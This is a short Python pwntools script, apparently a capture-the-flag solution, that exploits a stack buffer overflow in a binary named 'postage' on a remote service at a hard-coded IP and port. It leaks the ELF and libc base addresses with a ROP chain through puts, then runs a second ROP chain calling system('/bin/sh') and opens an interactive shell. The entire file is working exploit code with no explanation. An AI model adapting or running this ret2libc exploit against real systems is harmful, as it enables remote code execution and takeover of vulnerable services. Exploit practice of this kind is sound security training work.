#!/usr/bin/python3
from pwn import *

#init

e = ELF('./postage')
libc = ELF('./libc.so.6')

context.binary = e

#p = process(e.path)
p = remote('100.25.130.96', 9001)

#funcs

def sendvuln(s):
    p.sendlineafter(b'delivered', '0')
    p.sendlineafter(b'questions?\n', b'a' * 0x38 + s)

#exploit

#leaks

for i in range(2):
    p.recvuntil(b'Welcome to')

e.address = int(p.recvline(keepends = False), 16) - e.sym['vuln']

log.info('elf base: ' + hex(e.address))


rop = ROP(e)
rop.call(rop.ret)
rop.puts(e.got['puts'])
rop.vuln()

log.info(rop.dump())

sendvuln(rop.chain())

libc.address = u64(p.recvline(keepends = False).ljust(8, b'\x00')) - libc.sym['puts']

log.info('libc base: ' + hex(libc.address))

#call system

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b'/bin/sh')))

log.info(rop.dump())

sendvuln(rop.chain())

#pray for flag

p.interactive()
